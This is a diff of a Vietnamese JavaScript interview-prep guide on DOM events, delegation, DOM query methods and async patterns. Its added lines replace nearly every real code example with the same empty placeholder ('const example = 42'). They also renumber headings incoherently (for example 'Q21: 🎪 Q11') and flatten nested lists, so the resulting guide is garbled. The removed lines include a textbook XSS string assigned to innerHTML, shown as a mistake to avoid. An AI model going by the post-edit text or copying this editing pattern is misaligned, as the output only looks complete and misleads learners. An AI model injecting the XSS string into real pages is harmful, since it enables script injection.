 ```
 
 **📝 Tóm Tắt:**
@@ -4441,13 +1646,14 @@ const tax4 = calculateVAT(2000);
 | **HOF**        | Function nhận/trả về function                  | map, filter, reduce, compose  |
 | **Functional** | Paradigm tập trung vào pure functions, compose | Clean code, maintainable      |
 ---
-## 11. 🎪 Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)  
 
-**P1: Tên câu hỏi:** 🎪 Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)  
+## 21. Q21: 🎪 Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🎪 Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 22. Q22: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2 phút):**
 
@@ -4461,42 +1667,36 @@ const tax4 = calculateVAT(2000);
 **🔑 Khái Niệm Cốt Lõi:**
 - **Mặc định**: Event listeners chạy trong **Bubbling phase** (useCapture = false).
 - **Capturing**: Đặt `useCapture: true` → listener chạy trong Capturing phase.
-  ```js
-  element.addEventListener('click', handler, { capture: true });
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **Dừng Lan Truyền**: `event.stopPropagation()` → ngừng bubbling/capturing.
 - **Ngăn Hành Vi Mặc Định**: `event.preventDefault()` → ngăn hành vi mặc định (vd: form submit, chuyển link).
 
 **🎯 Mẫu Event Delegation:**
 - **Khái niệm**: Gắn listener ở phần tử cha, không phải từng con → tận dụng bubbling.
 - **Lợi ích**:
-  - Hiệu năng: 1 listener thay vì 100 listeners cho 100 items.
-  - Nội dung động: Không cần gắn lại listeners khi thêm/xóa con.
+- Hiệu năng: 1 listener thay vì 100 listeners cho 100 items.
+- Nội dung động: Không cần gắn lại listeners khi thêm/xóa con.
 - **Ví dụ**:
-  ```js
-  // ❌ Không hiệu quả: Gắn listener cho từng item
-  document.querySelectorAll('.item').forEach(item => {
-    item.addEventListener('click', handler); // Chú giải: 100 listeners!
-  });
-  
-  // ✅ Hiệu quả: Delegation
-  document.querySelector('.list').addEventListener('click', (e) => {
-    if (e.target.matches('.item')) { // Kiểm tra target
-      handler(e); // Chú giải: 1 listener!
-    }
-  });
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **🔍 `target` vs `currentTarget`:**
 - **`event.target`**: Phần tử thực sự được click (phần tử gốc kích hoạt sự kiện).
 - **`event.currentTarget`**: Phần tử có listener gắn vào (đang xử lý sự kiện).
 - **Trường hợp**: Delegation → `currentTarget` = cha, `target` = con được click.
-  ```js
-  parent.addEventListener('click', (e) => {
-    console.log(e.target); // Chú giải: Child element clicked
-    console.log(e.currentTarget); // Chú giải: Parent element (listener)
-  });
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **⚠️ Common Pitfalls:**
 - **stopPropagation() overuse**: Ngăn cả analytics tracking, global handlers → dùng thận trọng.
@@ -4506,9 +1706,12 @@ const tax4 = calculateVAT(2000);
 **💡 Senior Insights:**
 - **Performance**: Event delegation giảm memory usage (1 listener vs 1000) và faster DOM manipulation.
 - **Passive listeners**: `{ passive: true }` → improve scroll performance (không block scroll while waiting for preventDefault).
-  ```js
-  element.addEventListener('touchstart', handler, { passive: true });
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **once option**: `{ once: true }` → auto remove listener sau 1 lần fire.
 - **Capture for debugging**: Dùng capturing phase để intercept events trước khi children handle.
 
@@ -4531,38 +1734,15 @@ Giải thích chi tiết cơ chế hoạt động của DOM Events trong JavaScr
 3. Sự khác biệt giữa `target` và `currentTarget`
 4. Các best practices và common mistakes
 
-
-
 **📚 Phần 1: Event Flow - 3 Phases của DOM Events**
 
 **🔥 Cơ Chế Hoạt Động:**
 
 Khi một event xảy ra trên DOM element, nó đi qua 3 phases (giai đoạn):
 
-```
-Phase 1: CAPTURING PHASE (Giai đoạn bắt - từ trên xuống)
-   ↓
-   document
-   ↓
-   html
-   ↓
-   body
-   ↓
-   parent div
-   ↓
-Phase 2: TARGET PHASE (Giai đoạn mục tiêu)
-   ↓
-   target element (element được click)
-   ↓
-Phase 3: BUBBLING PHASE (Giai đoạn nổi - từ dưới lên)
-   ↑
-   parent div
-   ↑
-   body
-   ↑
-   html
-   ↑
-   document
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **💡 Giải Thích Tiếng Việt:**
@@ -4573,132 +1753,9 @@ Phase 3: BUBBLING PHASE (Giai đoạn nổi - từ dưới lên)
 
 **🎯 Code Example với Chú Thích Tiếng Việt:**
 
-```typescript
-// 📌 HTML Structure (Cấu trúc HTML)
- // Chú giải: <div id="grandparent" style="padding: 50px; background: red;">
-//   Grandparent (Ông)
- // Chú giải: <div id="parent" style="padding: 30px; background: blue;">
- // Chú giải: Parent (Cha)
- // Chú giải: <div id="child" style="padding: 20px; background: green;">
- // Chú giải: <button id="button">Click Me!</button>
- // Chú giải: </div>
- // Chú giải: </div>
- // Chú giải: </div>
-
- // Chú giải: ============================================
-// 🔵 EXAMPLE 1: EVENT BUBBLING (Mặc định)
-// Event nổi lên từ dưới lên: Button → Child → Parent → Grandparent
- // Chú giải: ============================================
-
-// Chú thích: addEventListener() mặc định lắng nghe ở BUBBLING phase
-// Tham số thứ 3 = false (hoặc không truyền) nghĩa là bubbling  
-document.getElementById('button')?.addEventListener('click', (e: Event) => {
-  console.log('1️⃣ Button clicked (bubbling)');
-  // Chạy đầu tiên vì button là target element (phần tử được click)
-});
-
-document.getElementById('child')?.addEventListener('click', (e: Event) => {
-  console.log('2️⃣ Child div clicked (bubbling)');
-  // Chạy thứ 2 - event nổi lên từ button
-});
-
-document.getElementById('parent')?.addEventListener('click', (e: Event) => {
-  console.log('3️⃣ Parent div clicked (bubbling)');
-  // Chạy thứ 3 - event tiếp tục nổi lên
-});
-
-document.getElementById('grandparent')?.addEventListener('click', (e: Event) => {
-  console.log('4️⃣ Grandparent div clicked (bubbling)');
-  // Chạy cuối cùng - event nổi đến tận ông nội
-});
-
-// 📝 KẾT QUẢ khi click button:
- // Chú giải: 1️⃣ Button clicked (bubbling)
- // Chú giải: 2️⃣ Child div clicked (bubbling)
- // Chú giải: 3️⃣ Parent div clicked (bubbling)
- // Chú giải: 4️⃣ Grandparent div clicked (bubbling)
-
- // Chú giải: ============================================
-// 🟢 EXAMPLE 2: EVENT CAPTURING (Bắt sự kiện)
-// Event rơi xuống từ trên xuống: Grandparent → Parent → Child → Button
- // Chú giải: ============================================
-
-// Chú thích: Tham số thứ 3 = true nghĩa là CAPTURING phase
-document.getElementById('grandparent')?.addEventListener(
-  'click',
-  (e: Event) => {
-    console.log('1️⃣ Grandparent clicked (capturing)');
-    // Chạy đầu tiên - ông nội bắt event trước
-  },
-  true // ⚠️ true = capturing phase (bắt từ trên xuống)
-);
-
-document.getElementById('parent')?.addEventListener(
-  'click',
-  (e: Event) => {
-    console.log('2️⃣ Parent clicked (capturing)');
-    // Chạy thứ 2 - cha bắt event
-  },
-  true
-);
-
-document.getElementById('child')?.addEventListener(
-  'click',
-  (e: Event) => {
-    console.log('3️⃣ Child clicked (capturing)');
-    // Chạy thứ 3 - con bắt event
-  },
-  true
-);
-
-document.getElementById('button')?.addEventListener(
-  'click',
-  (e: Event) => {
-    console.log('4️⃣ Button clicked (capturing)');
-    // Chạy cuối cùng - đến target element
-  },
-  true
-);
-
-// 📝 KẾT QUẢ khi click button:
- // Chú giải: 1️⃣ Grandparent clicked (capturing)
- // Chú giải: 2️⃣ Parent clicked (capturing)
- // Chú giải: 3️⃣ Child clicked (capturing)
- // Chú giải: 4️⃣ Button clicked (capturing)
-
- // Chú giải: ============================================
- // Chú giải: 🛑 EXAMPLE 3: STOP PROPAGATION
-// Dừng event lan truyền (không nổi lên hoặc rơi xuống nữa)
- // Chú giải: ============================================
-
-document.getElementById('child')?.addEventListener('click', (e: Event) => {
-  console.log('Child clicked');
-  e.stopPropagation(); // ⛔ Dừng event tại đây - không lan truyền nữa
-  // Event KHÔNG nổi lên parent và grandparent
-});
-
-document.getElementById('parent')?.addEventListener('click', () => {
-  console.log('Parent clicked'); // ❌ KHÔNG chạy vì bị stopPropagation()
-});
-
- // Chú giải: ============================================
- // Chú giải: 🚫 EXAMPLE 4: PREVENT DEFAULT
-// Ngăn hành vi mặc định của trình duyệt
- // Chú giải: ============================================
-
-// Ví dụ 1: Ngăn link navigate
-document.getElementById('myLink')?.addEventListener('click', (e: Event) => {
-  e.preventDefault(); // ⛔ Ngăn trình duyệt chuyển trang
-  console.log('Link clicked but navigation prevented');
-  // Chú thích: Thay vì chuyển trang, ta có thể xử lý logic khác
-});
-
-// Ví dụ 2: Ngăn form submit
-document.getElementById('myForm')?.addEventListener('submit', (e: Event) => {
-  e.preventDefault(); // ⛔ Ngăn form gửi đi (reload trang)
-  console.log('Form submit prevented - validating data...');
-  // Chú thích: Validate dữ liệu trước khi submit bằng AJAX
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -4712,67 +1769,15 @@ Event Delegation là kỹ thuật thay vì gắn event listener cho từng eleme
 **💡 Lợi Ích:**
 
 1. **Performance tốt hơn**: Chỉ có 1 event listener thay vì hàng trăm/ngàn listeners
-2. **Memory hiệu quả**: Ít listeners = ít bộ nhớ  
+2. **Memory hiệu quả**: Ít listeners = ít bộ nhớ
 3. **Dynamic content**: Tự động handle các elements được thêm sau
 4. **Maintainability**: Code dễ bảo trì hơn
 
 **🎯 Code Example với Chú Thích Chi Tiết:**
 
-```typescript
- // Chú giải: ============================================
-// ❌ CÁCH KHÔNG HIỆU QUẢ: Attach event cho từng item
- // Chú giải: ============================================
-
- // Chú giải: HTML: <ul id="todoList">
- // Chú giải: <li class="todo-item" data-id="1">Task 1 <button class="delete">X</button></li>
- // Chú giải: <li class="todo-item" data-id="2">Task 2 <button class="delete">X</button></li>
- // Chú giải: <li class="todo-item" data-id="3">Task 3 <button class="delete">X</button></li>
- // Chú giải: </ul>
-
-// ❌ VẤN ĐỀ: Nếu có 1000 items thì tạo 1000 event listeners!
-const todoItems = document.querySelectorAll('.todo-item');
-todoItems.forEach((item) => {
-  item.addEventListener('click', (e: Event) => {
-    console.log('Todo clicked:', item.dataset.id);
-    // Chú thích: Mỗi item có 1 listener riêng → tốn memory
-  });
-});
-
- // Chú giải: ============================================
-// ✅ CÁCH HIỆU QUẢ: EVENT DELEGATION
- // Chú giải: ============================================
-
-// ✅ Chỉ cần 1 listener trên parent (ul)
-document.getElementById('todoList')?.addEventListener('click', (e: Event) => {
-  const target = e.target as HTMLElement;
-
-  // Chú thích: Kiểm tra xem element được click có phải là todo-item không
-  if (target.classList.contains('todo-item')) {
-    console.log('✅ Todo clicked:', target.dataset.id);
-    // Chú thích: Xử lý click vào todo item
-  }
-
-  // Chú thích: Kiểm tra xem có phải click vào nút delete không
-  if (target.classList.contains('delete')) {
-    // closest() tìm parent element gần nhất có class 'todo-item'
-    const todoItem = target.closest('.todo-item') as HTMLElement;
-    console.log('🗑️ Delete clicked for todo:', todoItem?.dataset.id);
-    todoItem?.remove(); // Xóa todo item
-  }
-});
-
-// ✅ Thêm item mới - KHÔNG CẦN attach listener
-function addTodoItem(text: string, id: string): void {
-  const todoList = document.getElementById('todoList');
-  const newItem = document.createElement('li');
-  newItem.className = 'todo-item';
-  newItem.dataset.id = id;
-  newItem.innerHTML = `${text} <button class="delete">X</button>`;
-  todoList?.appendChild(newItem);
-  
-  // 🎉 Event delegation tự động handle item mới!
-  // Không cần addEventListener() ở đây
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -4786,19 +1791,9 @@ function addTodoItem(text: string, id: string): void {
 
 **🎯 Code Example:**
 
-```typescript
- // Chú giải: HTML: <div id="parent">
- // Chú giải: <button id="child">Click Me!</button>
- // Chú giải: </div>
-
-document.getElementById('parent')?.addEventListener('click', (e: Event) => {
-  console.log('target:', e.target); // Chú giải: <button id="child">
-  console.log('currentTarget:', e.currentTarget); // Chú giải: <div id="parent">
-  
-  // Chú thích:
-  // - target = button (thứ được click thực sự)
-  // - currentTarget = div parent (nơi có addEventListener)
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **📌 So Sánh:**
@@ -4827,13 +1822,14 @@ document.getElementById('parent')?.addEventListener('click', (e: Event) => {
 4. Event delegation nhưng không check target
 5. Mix capturing và bubbling không rõ ràng
 ---
-## 12. 🌐 Q12: DOM API & Query Methods  
 
-**P1: Tên câu hỏi:** 🌐 Q12: DOM API & Query Methods  
+## 23. Q23: 🌐 Q12: DOM API & Query Methods
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🌐 Q12: DOM API & Query Methods
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 24. Q24: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -4867,17 +1863,14 @@ document.getElementById('parent')?.addEventListener('click', (e: Event) => {
 
 **💡 Kiến Thức Senior:**
 - **Live vs Static**: HTMLCollection (live) vs NodeList (có thể live hoặc static tùy method)
-  - `getElementsBy*` → live HTMLCollection
-  - `querySelectorAll` → static NodeList
-  - `childNodes` → live NodeList
+- `getElementsBy*` → live HTMLCollection
+- `querySelectorAll` → static NodeList
+- `childNodes` → live NodeList
 - **Reflow/Repaint**: Mỗi DOM manipulation có thể trigger layout recalculation
-  - Batch updates: dùng DocumentFragment hoặc `.innerHTML` thay vì nhiều `.appendChild()`
-  - Read trước, write sau để tránh **layout thrashing** (đọc offsetHeight → ghi style → đọc → ghi → ...)
+- Batch updates: dùng DocumentFragment hoặc `.innerHTML` thay vì nhiều `.appendChild()`
+- Read trước, write sau để tránh **layout thrashing** (đọc offsetHeight → ghi style → đọc → ghi → ...)
 - **MutationObserver** hiệu quả hơn polling DOM changes
 - Modern frameworks (React, Vue) dùng Virtual DOM để minimize direct DOM manipulation
-
-
-
 
 **⚡ Quick Summary:**
 > querySelector = CSS selector. getElementById = nhanh nhất. querySelectorAll = NodeList
@@ -4897,75 +1890,9 @@ document.getElementById('parent')?.addEventListener('click', (e: Event) => {
 
 **Code Example:**
 
-```typescript
- // Chú giải: Query Methods
-// getElementById - trả về single element
-const element = document.getElementById('myId');
-if (element) {
-  element.textContent = 'Hello World';
-}
-
-// querySelector - trả về first matching element
-const firstDiv = document.querySelector('div');
-const firstClass = document.querySelector('.my-class');
-const firstId = document.querySelector('#my-id');
-
-// querySelectorAll - trả về NodeList
-const allDivs = document.querySelectorAll('div');
-const allClasses = document.querySelectorAll('.my-class');
-
-// getElementsByClassName - trả về HTMLCollection
-const elementsByClass = document.getElementsByClassName('my-class');
-
-// getElementsByTagName - trả về HTMLCollection
-const elementsByTag = document.getElementsByTagName('div');
-
- // Chú giải: DOM Manipulation
-const div = document.createElement('div');
-div.textContent = 'New element';
-div.className = 'my-class';
-div.id = 'new-id';
-
- // Chú giải: Append to DOM
-document.body.appendChild(div);
-
- // Chú giải: Insert before
-const existingElement = document.getElementById('existing');
-existingElement?.parentNode?.insertBefore(div, existingElement);
-
- // Chú giải: Remove element
-div.remove();
-
- // Chú giải: Update attributes
-div.setAttribute('data-id', '123');
-div.getAttribute('data-id'); // Chú giải: '123'
-div.removeAttribute('data-id');
-
- // Chú giải: Update classes
-div.classList.add('new-class');
-div.classList.remove('old-class');
-div.classList.toggle('active');
-div.classList.contains('active'); // Chú giải: true/false
-
- // Chú giải: Update styles
-div.style.color = 'red';
-div.style.backgroundColor = 'blue';
-div.style.display = 'none';
-
- // Chú giải: Update content
-div.textContent = 'Text content';
-div.innerHTML = '<span>HTML content</span>';
-div.innerText = 'Text only (no HTML)';
-
- // Chú giải: Event handling
-div.addEventListener('click', (e: Event) => {
-  console.log('Div clicked');
-});
-
- // Chú giải: Remove event listener
-const clickHandler = (e: Event) => console.log('Clicked');
-div.addEventListener('click', clickHandler);
-div.removeEventListener('click', clickHandler);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Best Practices:**
@@ -4977,32 +1904,20 @@ div.removeEventListener('click', clickHandler);
 
 **Mistakes:**
 
-```typescript
-// ❌ Sai: Không check null
-const element = document.getElementById('myId');
-element.textContent = 'Hello'; // Error nếu element null
-
-// ✅ Đúng: Check null
-const element = document.getElementById('myId');
-if (element) {
-  element.textContent = 'Hello';
-}
-
- // Chú giải: ❌ Sai: Sử dụng innerHTML với user input
-const userInput = '<script>alert("XSS")</script>';
-div.innerHTML = userInput; // Chú giải: XSS vulnerability
-
-// ✅ Đúng: Sử dụng textContent
-div.textContent = userInput; // Chú giải: Safe
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 ---
-## 13. ⚙️ Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race  
 
-**P1: Tên câu hỏi:** ⚙️ Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race  
+## 25. Q25: ⚙️ Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ⚙️ Q13: Async/Await vs Promises vs Callbacks & Promise.all/any/race
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 26. Q26: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -5010,78 +1925,56 @@ div.textContent = userInput; // Chú giải: Safe
 
 **📊 Tiến Hóa Mẫu Async:**
 1. **Callbacks**: Hàm làm tham số → thực thi sau khi hoàn thành thao tác bất đồng bộ.
-   - ❌ Callback Hell (kim tự tháp hủy diệt), xử lý lỗi khó.
-   - ✅ Đơn giản, hỗ trợ phổ biến.
+- ❌ Callback Hell (kim tự tháp hủy diệt), xử lý lỗi khó.
+- ✅ Đơn giản, hỗ trợ phổ biến.
 
 2. **Promises**: Object đại diện cho việc hoàn thành/thất bại trong tương lai.
-   - ✅ Chuỗi (`.then()`), xử lý lỗi tốt hơn (`.catch()`), tránh callback hell.
-   - ❌ Vẫn dài dòng, có thể `.then()` hell.
-   - **Trạng thái**: Pending → Fulfilled (resolved) | Rejected.
+- ✅ Chuỗi (`.then()`), xử lý lỗi tốt hơn (`.catch()`), tránh callback hell.
+- ❌ Vẫn dài dòng, có thể `.then()` hell.
+- **Trạng thái**: Pending → Fulfilled (resolved) | Rejected.
 
 3. **Async/Await**: Cú pháp đường cho Promises → code giống sync.
-   - ✅ Dễ đọc (như code sync), `try/catch` cho lỗi.
-   - ❌ Phải dùng `await` trong hàm `async`, tuần tự theo mặc định (không song song).
+- ✅ Dễ đọc (như code sync), `try/catch` cho lỗi.
+- ❌ Phải dùng `await` trong hàm `async`, tuần tự theo mặc định (không song song).
 
 **🔧 Promise Combinators (4 Phương Thức):**
 1. **`Promise.all([p1, p2, p3])`**:
-   - Đợi TẤT CẢ promises resolve.
-   - Reject ngay nếu 1 promise reject (thất bại nhanh).
-   - Trả về mảng kết quả theo thứ tự.
-   - ✅ Trường hợp: Lấy nhiều tài nguyên, tất cả đều cần.
+- Đợi TẤT CẢ promises resolve.
+- Reject ngay nếu 1 promise reject (thất bại nhanh).
+- Trả về mảng kết quả theo thứ tự.
+- ✅ Trường hợp: Lấy nhiều tài nguyên, tất cả đều cần.
 
 2. **`Promise.allSettled([p1, p2, p3])`**:
-   - Đợi TẤT CẢ promises hoàn thành (fulfilled hoặc rejected).
-   - Không bao giờ reject.
-   - Trả về mảng `{ status, value/reason }`.
-   - ✅ Trường hợp: Thực thi tất cả, không quan tâm thành công/thất bại của từng cái.
+- Đợi TẤT CẢ promises hoàn thành (fulfilled hoặc rejected).
+- Không bao giờ reject.
+- Trả về mảng `{ status, value/reason }`.
+- ✅ Trường hợp: Thực thi tất cả, không quan tâm thành công/thất bại của từng cái.
 
 3. **`Promise.race([p1, p2, p3])`**:
-   - Resolve/reject với promise đầu tiên hoàn thành (nhanh nhất thắng).
-   - ✅ Trường hợp: Cơ chế timeout, phản hồi server nhanh nhất.
+- Resolve/reject với promise đầu tiên hoàn thành (nhanh nhất thắng).
+- ✅ Trường hợp: Cơ chế timeout, phản hồi server nhanh nhất.
 
 4. **`Promise.any([p1, p2, p3])`**:
-   - Resolve với promise đầu tiên fulfilled.
-   - Reject nếu TẤT CẢ reject (AggregateError).
-   - ✅ Trường hợp: Cơ chế dự phòng, phản hồi thành công đầu tiên.
+- Resolve với promise đầu tiên fulfilled.
+- Reject nếu TẤT CẢ reject (AggregateError).
+- ✅ Trường hợp: Cơ chế dự phòng, phản hồi thành công đầu tiên.
 
 **🎯 Practical Examples:**
+
 ```js
- // Chú giải: Sequential (slow - 3s total)
-async function sequential() {
-  const user = await fetchUser(); // Chú giải: 1s
-  const posts = await fetchPosts(); // Chú giải: 1s
-  const comments = await fetchComments(); // Chú giải: 1s
-}
-
- // Chú giải: Parallel (fast - 1s total)
-async function parallel() {
-  const [user, posts, comments] = await Promise.all([
-    fetchUser(),
-    fetchPosts(),
-    fetchComments()
-  ]); // Chú giải: All run concurrently!
-}
-
- // Chú giải: Timeout with race
-const fetchWithTimeout = (url, timeout = 5000) => {
-  return Promise.race([
-    fetch(url),
-    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
-  ]);
-};
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **⚠️ Common Mistakes:**
 - **Forgot `await`**: Promise không execute → return Promise object, không phải value.
 - **Sequential khi có thể parallel**: `await` trong loop → chậm. Dùng `Promise.all()`.
-  ```js
- // Chú giải: ❌ Slow (sequential)
-  for (const id of ids) {
-    await fetchUser(id); // Chờ từng cái
-  }
- // Chú giải: ✅ Fast (parallel)
-  await Promise.all(ids.map(id => fetchUser(id)));
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **Unhandled rejections**: Missing `.catch()` hoặc `try/catch` → silent failures.
 - **Promise.all fail-fast**: 1 promise fail → tất cả fail. Dùng `allSettled` nếu cần.
 
@@ -5119,48 +2012,9 @@ const fetchWithTimeout = (url, timeout = 5000) => {
 
 **Code Example:**
 
-```typescript
- // Chú giải: Callbacks
-function fetchData(callback: (error: Error | null, data?: any) => void): void {
-  setTimeout(() => {
-    const data = { message: 'Hello World' };
-    callback(null, data);
-  }, 1000);
-}
-
-fetchData((error, data) => {
-  if (error) {
-    console.error('Error:', error);
-  } else {
-    console.log('Data:', data);
-  }
-});
-
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-function fetchDataPromise(): Promise<any> {
-  return new Promise((resolve, reject) => {
-    setTimeout(() => {
-      const data = { message: 'Hello World' };
-      resolve(data);
-    }, 1000);
-  });
-}
-
-fetchDataPromise()
-  .then((data) => console.log('Data:', data))
-  .catch((error) => console.error('Error:', error));
-
- // Chú giải: Async/Await
-async function fetchDataAsync(): Promise<any> {
-  try {
-    const data = await fetchDataPromise();
-    console.log('Data:', data);
-    return data;
-  } catch (error) {
-    console.error('Error:', error);
-    throw error;
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Best Practices:**
@@ -5180,96 +2034,16 @@ async function fetchDataAsync(): Promise<any> {
 
 **🔹 Problem: Async errors không bị catch**
 
-```typescript
-// ❌ VẤN ĐỀ: Unhandled Promise Rejection
-async function fetchUser(id: string) {
-  const response = await fetch(`/api/users/${id}`);
-  return response.json(); // Nếu response.json() throw error?
-}
-
- // Chú giải: Calling without try-catch → Unhandled rejection!
-fetchUser('123'); // ❌ Nếu API fail → unhandled rejection
-
-// ✅ GIẢI PHÁP 1: Try-catch trong function
-async function fetchUserSafe(id: string) {
-  try {
-    const response = await fetch(`/api/users/${id}`);
-    
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-    }
-    
-    return await response.json();
-  } catch (error) {
-    console.error('Failed to fetch user:', error);
-    throw error; // Re-throw để caller handle
-  }
-}
-
-// ✅ GIẢI PHÁP 2: Global error handler
-window.addEventListener('unhandledrejection', (event) => {
-  console.error('Unhandled promise rejection:', event.reason);
-  
- // Chú giải: Send to error tracking service (Sentry, Datadog)
-  sendToErrorTracking({
-    type: 'UNHANDLED_PROMISE_REJECTION',
-    error: event.reason,
-    timestamp: Date.now(),
-  });
-  
- // Chú giải: Prevent default browser behavior
-  event.preventDefault();
-});
-
-// ✅ GIẢI PHÁP 3: Wrapper function với automatic error handling
-async function safeAsync<T>(
-  fn: () => Promise<T>,
-  fallback?: T
-): Promise<T | undefined> {
-  try {
-    return await fn();
-  } catch (error) {
-    console.error('Async error:', error);
-    return fallback;
-  }
-}
-
- // Chú giải: Usage
-const user = await safeAsync(() => fetchUser('123'), { id: '123', name: 'Default' });
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔹 Problem: Mixed sync/async errors**
 
-```typescript
-// ❌ VẤN ĐỀ: Sync errors không được catch bởi try-catch async
-async function processData(data: any[]) {
-  try {
-    const validated = validateData(data); // Sync function có thể throw
-    const results = await Promise.all(
-      validated.map(item => processItem(item)) // Chú giải: Async function
-    );
-    return results;
-  } catch (error) {
-    // ⚠️ Catch được cả sync VÀ async errors
-    console.error('Process failed:', error);
-    throw error;
-  }
-}
-
-// ✅ BEST PRACTICE: Wrap sync code trong Promise nếu cần
-async function processDataSafe(data: any[]) {
-  try {
- // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý.
-    const validated = await Promise.resolve(validateData(data));
-    const results = await Promise.all(
-      validated.map(item => processItem(item))
-    );
-    return results;
-  } catch (error) {
-    console.error('Process failed:', error);
-    throw error;
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -5278,202 +2052,16 @@ async function processDataSafe(data: any[]) {
 
 **🔹 Problem: Multiple concurrent requests**
 
-```typescript
-// ❌ VẤN ĐỀ: User search - requests out of order
-let searchTerm = '';
-
-async function handleSearch(term: string) {
-  searchTerm = term;
-  
- // Chú giải: Slow request (200ms)
-  const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
-  
-  // ⚠️ VẤN ĐỀ: Nếu user type "abc" rồi xóa về "ab":
-  // Request "ab" gửi trước, nhưng "abc" về sau
-  // → Hiển thị sai kết quả!
-  displayResults(results);
-}
-
-// ✅ GIẢI PHÁP 1: Track latest request với counter
-let requestId = 0;
-
-async function handleSearchSafe(term: string) {
-  const currentRequestId = ++requestId;
-  
-  const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
-  
-  // Chỉ hiển thị nếu là request mới nhất
-  if (currentRequestId === requestId) {
-    displayResults(results);
-  } else {
-    console.log('Discarding stale result');
-  }
-}
-
-// ✅ GIẢI PHÁP 2: AbortController để cancel previous requests
-let abortController: AbortController | null = null;
-
-async function handleSearchWithAbort(term: string) {
- // Chú giải: Cancel previous request
-  if (abortController) {
-    abortController.abort();
-  }
-  
- // Chú giải: Create new controller
-  abortController = new AbortController();
-  
-  try {
-    const results = await fetch(`/api/search?q=${term}`, {
-      signal: abortController.signal,
-    }).then(r => r.json());
-    
-    displayResults(results);
-  } catch (error: any) {
-    if (error.name === 'AbortError') {
-      console.log('Request cancelled');
-    } else {
-      throw error;
-    }
-  }
-}
-
-// ✅ GIẢI PHÁP 3: Debounce + Abort (Best for search)
-import { debounce } from 'lodash';
-
-let searchAbortController: AbortController | null = null;
-
-const debouncedSearch = debounce(async (term: string) => {
-  if (searchAbortController) {
-    searchAbortController.abort();
-  }
-  
-  searchAbortController = new AbortController();
-  
-  try {
-    const results = await fetch(`/api/search?q=${term}`, {
-      signal: searchAbortController.signal,
-    }).then(r => r.json());
-    
-    displayResults(results);
-  } catch (error: any) {
-    if (error.name !== 'AbortError') {
-      console.error('Search failed:', error);
-    }
-  }
-}, 300); // Chú giải: Wait 300ms sau khi user ngừng typing
-
- // Chú giải: Usage: Gọi mỗi khi user type
-inputElement.addEventListener('input', (e) => {
-  debouncedSearch(e.target.value);
-});
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🔹 Problem: Concurrent updates to shared state**
 
-```typescript
-// ❌ VẤN ĐỀ: Multiple async operations update same state
-let balance = 1000;
-
-async function withdraw(amount: number) {
- // Chú giải: Simulate API call
-  await delay(100);
-  
-  if (balance >= amount) {
-    balance -= amount; // Chú giải: ⚠️ Race condition!
-    console.log(`Withdrew ${amount}, balance: ${balance}`);
-  }
-}
-
-// Gọi đồng thời
-withdraw(600); // Chú giải: T0: Check balance = 1000 ✅
-withdraw(600); // Chú giải: T1: Check balance = 1000 ✅
- // Chú giải: T2: Balance = 400 ❌ (Should be rejected!)
-
-// ✅ GIẢI PHÁP 1: Mutex lock
-class Mutex {
-  private locked = false;
-  private waiting: Array<() => void> = [];
-  
-  async lock(): Promise<void> {
-    if (!this.locked) {
-      this.locked = true;
-      return;
-    }
-    
- // Chú giải: Wait for unlock
-    await new Promise<void>(resolve => {
-      this.waiting.push(resolve);
-    });
-  }
-  
-  unlock(): void {
-    const next = this.waiting.shift();
-    if (next) {
-      next();
-    } else {
-      this.locked = false;
-    }
-  }
-}
-
-const balanceMutex = new Mutex();
-
-async function withdrawSafe(amount: number) {
-  await balanceMutex.lock();
-  
-  try {
